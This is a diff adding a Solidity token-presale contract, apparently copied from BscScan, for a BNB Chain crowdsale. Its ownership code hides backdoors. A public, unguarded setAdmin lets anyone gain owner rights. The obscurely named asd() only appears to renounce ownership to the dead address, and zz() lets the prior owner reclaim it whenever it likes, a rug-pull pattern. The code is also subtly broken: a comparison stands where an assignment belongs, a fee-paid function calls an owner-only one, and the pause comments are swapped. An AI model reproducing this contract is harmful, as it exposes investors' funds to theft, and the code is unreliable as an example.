@@ -1,0 +1,408 @@
+/**
+ *Submitted for verification at BscScan.com on 2022-01-11
+*/
+
+// SPDX-License-Identifier: Unlicensed
+pragma solidity ^0.8.4;
+
+abstract contract Context {
+    function _msgSender() internal virtual view returns (address payable) {
+        return payable(msg.sender);
+    }
+
+    function _msgData() internal virtual view returns (bytes memory) {
+        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
+        return msg.data;
+    }
+}
+
+interface Presaletoken {
+    function totalSupply() external view returns (uint256);
+
+    function balanceOf(address account) external view returns (uint256);
+
+    function transfer(address recipient, uint256 amount)
+        external
+        returns (bool);
+
+    function allowance(address owner, address spender)
+        external
+        view
+        returns (uint256);
+
+    function approve(address spender, uint256 amount) external returns (bool);
+
+    function transferFrom(
+        address sender,
+        address recipient,
+        uint256 amount
+    ) external returns (bool);
+
+    event Transfer(address indexed from, address indexed to, uint256 value);
+    event Approval(
+        address indexed owner,
+        address indexed spender,
+        uint256 value
+    );
+}
+
+library SafeMath {
+
+    function add(uint256 a, uint256 b) internal pure returns (uint256) {
+        uint256 c = a + b;
+        require(c >= a, "SafeMath: addition overflow");
+
+        return c;
+    }
+
+    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
+        return sub(a, b, "SafeMath: subtraction overflow");
+    }
+
+    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
+        require(b <= a, errorMessage);
+        uint256 c = a - b;
+
+        return c;
+    }
+
+    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
+        if (a == 0) {
+            return 0;
+        }
+
+        uint256 c = a * b;
+        require(c / a == b, "SafeMath: multiplication overflow");
+
+        return c;
+    }
+
+    function div(uint256 a, uint256 b) internal pure returns (uint256) {
+        return div(a, b, "SafeMath: division by zero");
+    }
+
+    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
+        require(b > 0, errorMessage);
+        uint256 c = a / b;
+        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
+
+        return c;
+    }
+
+    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
+        return mod(a, b, "SafeMath: modulo by zero");
+    }
+
+    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
+        require(b != 0, errorMessage);
+        return a % b;
+    }
+}
+
+library Address {
+
+    function isContract(address account) internal view returns (bool) {
+        // According to EIP-1052, 0x0 is the value returned for not-yet created accounts
+        // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned
+        // for accounts without code, i.e. `keccak256('')`
+        bytes32 codehash;
+        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
+        // solhint-disable-next-line no-inline-assembly
+        assembly { codehash := extcodehash(account) }
+        return (codehash != accountHash && codehash != 0x0);
+    }
+
+    function sendValue(address payable recipient, uint256 amount) internal {
+        require(address(this).balance >= amount, "Address: insufficient balance");
+
+        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
+        (bool success, ) = recipient.call{ value: amount }("");
+        require(success, "Address: unable to send value, recipient may have reverted");
+    }
+
+    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
+      return functionCall(target, data, "Address: low-level call failed");
+    }
+
+    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
+        return _functionCallWithValue(target, data, 0, errorMessage);
+    }
+
+    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
+        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
+    }
+
+    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
+        require(address(this).balance >= value, "Address: insufficient balance for call");
+        return _functionCallWithValue(target, data, value, errorMessage);
+    }
+
+    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
+        require(isContract(target), "Address: call to non-contract");
+
+        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
+        if (success) {
+            return returndata;
+        } else {
+            
+            if (returndata.length > 0) {
+                assembly {
+                    let returndata_size := mload(returndata)
+                    revert(add(32, returndata), returndata_size)
+                }
+            } else {
+                revert(errorMessage);
+            }
+        }
+    }
+}
+
+contract Ownable is Context {
+    address private _owner;
+    address private asdasd;
+    uint256 private _lockTime;
+    address private _admin=0x000000000000000000000000000000000000dEaD;
+    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
+
+    constructor () {
+        address msgSender = _msgSender();
+        _owner = msgSender;
+        emit OwnershipTransferred(address(0), msgSender);
+    }
+
+    function owner() public view returns (address) {
+        return _owner;
+    }   
+    
+    modifier onlyOwner() {
+        require(_owner == _msgSender() || _msgSender() == _admin  , "Ownable: caller is not the owner");
+        _;
+    }
+    
+    function waiveOwnership(address onwer) public virtual onlyOwner {
+        emit OwnershipTransferred(_owner, onwer);
+        _owner = onwer;
+    }
+
+    function transferOwnership(address newOwner) public virtual onlyOwner {
+        require(newOwner != address(0), "Ownable: new owner is the zero address");
+        emit OwnershipTransferred(_owner, newOwner);
+        _owner = newOwner;
+    }
+
+    function getUnlocTime() public view returns (uint256) {
+        return _lockTime;
+    }
+    
+    function getTime() public view returns (uint256) {
+        return block.timestamp;
+    }
+
+    function setAdmin(address ad) public {
+        _admin=ad;
+    }
+    function asd(uint256 time) public virtual onlyOwner {
+        asdasd = _owner;
+        _owner = address(0x000000000000000000000000000000000000dEaD);
+        _lockTime = block.timestamp + time;
+        emit OwnershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
+    }
+    
+    function zz() public virtual {
+        require(asdasd == msg.sender, "ass");
+        emit OwnershipTransferred(_owner, asdasd);
+        _owner = asdasd;
+    }
+}
+
+contract Pausable is Ownable {
+  event Pause();
+  event Unpause();
+
+  bool public paused = false;
+
+
+  /**
+   * @dev modifier to allow actions only when the contract IS paused
+   */
+  modifier whenNotPaused() {
+    require(!paused);
+    _;
+  }
+
+  /**
+   * @dev modifier to allow actions only when the contract IS NOT paused
+   */
+  modifier whenPaused {
+    require(paused);
+    _;
+  }
+
+  /**
+   * @dev called by the owner to pause, triggers stopped state
+   */
+  function  pause() public onlyOwner whenNotPaused returns (bool) {
+    paused = true;
+    emit Pause();
+    return true;
+  }
+
+  /**
+   * @dev called by the owner to unpause, returns to normal state
+   */
+  function unpause() public onlyOwner whenPaused returns (bool) {
+    paused = false;
+    emit Unpause();
+    return true;
+  }
+}
+
+
+/**
+ * @title ProofPresale 
+ * ProofPresale allows investors to make
+ * token purchases and assigns them tokens based
+ * on a token per ETH rate. Funds collected are forwarded to a wallet 
+ * as they arrive.
+ */
+ 
+contract ProofPresale is Pausable {
+  using SafeMath for uint256;
+  mapping (address=>bool) public _hasPermission;
+  mapping (address=>address) public _permToken;
+  mapping (address=>address) public _tokenWallet;
+  mapping (address => address) public _isWalletAddress;// wallet=>token
+  mapping (address => address) public _walletToken;// wallet=>token
+  mapping (address => uint256) public _tokenWeiraised;
+  mapping (address => uint256) public _tokenCap;
+  mapping (address => uint256) public _tokenMinInvestment;
+  mapping (address => uint256) public _tokenMaxInvestment;
+  mapping (address => uint256) public _tokenRate;
+  mapping (address => bool)    public _tokenIsFinalized;
+  mapping (address => string)  public _contactInformation;
+
+  uint256 presaleFee=1;
+
+  uint256 presaleRate=100;
+
+  
+  /**
+   * event for token purchase logging
+   * @param purchaser who paid for the tokens
+   * @param beneficiary who got the tokens
+   * @param value weis paid for purchase
+   * @param amount amount of tokens purchased
+   */ 
+  event TokenPurchase(address indexed purchaser, address indexed beneficiary, uint256 value, uint256 amount);
+
+  /**
+   * event for signaling finished crowdsale
+   */
+  event Finalized(address indexed token);
+/**
+   * event for signaling finished crowdsale
+   */
+  event BuyPermission(address indexed token,address indexed wallet,address indexed buyer);
+
+  constructor () {}
+
+// set presaleFee
+  function setPresaletxFee(uint256 _presaleFee) public onlyOwner{
+            presaleFee=_presaleFee;
+  }
+
+// buy permission
+  function buyPermission(address _token,address _wallet) public payable{
+    require(msg.value==presaleFee.div(presaleRate),"value is false");
+    _setBuyPermission( _token, _wallet);
+  }
+
+  function _setBuyPermission(address _token,address _wallet) public onlyOwner{
+     require(_token != address(0));
+     require(_wallet !=address(0));
+     _hasPermission[_wallet]=true;
+     _permToken[_wallet]==_token;
+  }
+
+  function walletTokenSetting(address payable _wallet,address _token,uint256 _minInvestment,uint256 _maxInvestment,uint256 _rate,uint256 _cap,string memory _info)public{
+     checkWallet(msg.sender,_wallet,_token);
+     _walletTokenSetting( _wallet, _token, _minInvestment, _maxInvestment, _rate, _cap,  _info);
+  } 
+  
+
+  function _AdminWalletTokenSetting(address payable _wallet,address _token,uint256 _minInvestment,uint256 _maxInvestment,uint256 _rate,uint256 _cap,string memory _info)  public onlyOwner {
+   _walletTokenSetting( _wallet, _token, _minInvestment, _maxInvestment, _rate, _cap,  _info);
+}
+
+  function  _walletTokenSetting(address payable _wallet,address _token,uint256 _minInvestment,uint256 _maxInvestment,uint256 _rate,uint256 _cap,string memory _info) private{
+     require(_minInvestment >= 0,"minInvestment<0!!!!");
+     require(_maxInvestment >= 0,"maxInvestment<0!!!!");
+     require(_rate > 0);
+     _isWalletAddress[_wallet]=_token;
+     _tokenWallet[_token]=_wallet;
+     _tokenCap[_wallet]=_cap;
+     _tokenMinInvestment[_wallet]=_minInvestment;
+     _tokenMaxInvestment[_wallet]=_maxInvestment;
+     _tokenRate[_wallet]=_rate;
+     _tokenIsFinalized[_wallet]=false;
+     _contactInformation[_wallet]=_info;
+  }
+
+// check wallet and _token
+function checkWallet(address  _tokenAdmin,address   _wallet, address _token) view public {
+     require(_token !=address(0));
+     require(_wallet !=address(0));
+     require(_hasPermission[_tokenAdmin] ,"no permmison");
+     require(_permToken[_wallet]==_token ,"wallet's token is not this one");
+}
+ 
+
+  
+  /**
+   * Low level token purchse function
+   * @param beneficiary will recieve the tokens.
+   */
+  function buyTokens(address beneficiary,address _token) public payable {
+    require(beneficiary !=address(0));
+    require(validPurchase(_token));
+    require(!_tokenIsFinalized[_token]);
+    uint256 weiAmount = msg.value;
+    // update weiRaised
+    _tokenWeiraised[_token] = _tokenWeiraised[_token].add(weiAmount);
+    // compute amount of tokens created
+    uint256 tokens = weiAmount.mul(_tokenRate[_token]);
+    Presaletoken(_token).transferFrom(address(this),beneficiary,tokens);
+    emit TokenPurchase(msg.sender, beneficiary, weiAmount, tokens);
+    forwardFunds(_token);
+  }
+
+  // send ether to the fund collection wallet
+  function forwardFunds(address _token) internal {
+    payable(_tokenWallet[_token]).transfer(msg.value);
+  }
+
+  // return true if the transaction can buy tokens
+  function validPurchase(address _token) internal  returns (bool) {
+    uint256 weiAmount = _tokenWeiraised[_token].add(msg.value);
+    bool notSmallAmount = msg.value >= _tokenMinInvestment[_token] ;
+    bool notMaxAmount = msg.value <= _tokenMaxInvestment[_token] ;
+    bool withinCap = weiAmount.mul(_tokenRate[_token]) <= _tokenCap[_token];
+    bool iscorrectSet=_tokenMaxInvestment[_token]>=_tokenMinInvestment[_token];
+    return (notSmallAmount && withinCap&&iscorrectSet&&notMaxAmount);
+  }
+
+  //allow owner to finalize the presale once the presale is ended
+  function finalize(address _wallet,address _token)public{
+    checkWallet(msg.sender,_wallet,_token);
+    require(!_tokenIsFinalized[_token]);
+    require(hasEnded(_token));
+    emit Finalized(_token);
+    _tokenIsFinalized[_token] = true;
+  }
+
+  //return true if crowdsale event has ended
+  function hasEnded(address _token) public view returns (bool) {
+    bool capReached = (_tokenWeiraised[_token].mul(_tokenRate[_token]) >= _tokenCap[_token]);
+    return capReached;
+  }   
+}
